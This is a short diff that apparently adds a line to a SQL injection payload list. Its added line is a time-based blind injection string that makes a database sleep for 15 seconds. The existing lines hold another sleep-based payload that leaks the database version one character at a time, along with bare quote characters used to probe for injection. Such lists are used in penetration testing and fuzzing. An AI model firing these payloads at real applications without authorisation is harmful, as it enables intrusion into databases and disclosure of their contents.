@@ -1,3 +1,4 @@
+(select*from(select(sleep(15)))a)
 'OR+(SELECT+1+FROM+(SELECT(SLEEP(MID(version(),1,1))))test)+OR+'.test'='.test
 '
 ''
